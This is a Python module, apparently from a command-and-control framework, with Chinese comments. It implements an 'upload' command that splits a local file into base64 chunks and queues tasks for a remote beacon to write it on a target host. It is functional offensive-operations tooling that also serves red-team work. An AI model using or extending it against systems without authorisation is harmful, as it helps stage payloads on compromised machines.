"""upload — 推送本地文件到 beacon（分块入队，自动覆盖+追加）:
upload <beacon_id> <local_path> <remote_path>
"""

import base64
import os

from server.task_queue import Task

_CHUNK = 180 * 1024  # 原始字节/块（base64 后 ~240KB，帧内）


def run(disp, args):
    if len(args) < 3:
        return "[!] usage: upload <beacon_id> <local_path> <remote_path>"
    bid, local, remote = args[0], args[1], args[2]
    try:
        with open(local, "rb") as f:
            data = f.read()
    except OSError as e:
        return f"[!] {e}"

    total = (len(data) + _CHUNK - 1) // _CHUNK
    pushed = 0
    for off in range(0, len(data), _CHUNK):
        b64 = base64.b64encode(data[off:off + _CHUNK]).decode("ascii")
        append = "0" if off == 0 else "1"  # 首块覆盖，后续追加
        try:
            task = disp.build_task("upload", [remote, b64, append])
        except ValueError as e:
            return f"[!] {e}"
        # push 返回值必须检查: 队列满时静默丢块会让目标文件残缺且无提示
        # (2026-09-04 修复)
        msg = disp.push_task(bid, task)
        if not msg.startswith("[+]"):
            if pushed == 0:
                return f"[!] {msg.strip() or '任务入队失败'}"
            return (f"[!] 队列已满,仅入队 {pushed}/{total} 块 "
                    f"({len(data)} 字节文件不完整)——请等待 beacon 回连消化后重试")
        pushed += 1
    if pushed == 0:
        return "[!] 空文件，未下发"
    return f"[+] 已入队 {pushed} 块 (共 {len(data)} 字节) → {bid}:{remote}"
